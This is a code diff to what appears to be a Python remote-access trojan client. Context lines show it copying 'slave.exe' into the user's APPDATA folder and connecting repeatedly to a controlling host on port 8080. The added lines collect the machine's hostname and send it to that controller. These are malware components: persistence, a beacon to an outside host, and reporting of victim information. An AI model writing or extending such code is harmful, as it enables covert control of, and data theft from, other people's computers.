@@ -14,6 +14,7 @@ shutil.move(os.path.dirname(sys.executable) + "\\slave.exe", os.environ["appdata
 
 s = socket.socket()
 host = "S20364-PC"
+hostname = socket.gethostname()
 port = 8080
 connected = False
 while not connected:
@@ -26,6 +27,7 @@ while not connected:
 
 
 # print("Connected to server!")
+s.send(hostname.encode())
 
 while True:
     try:
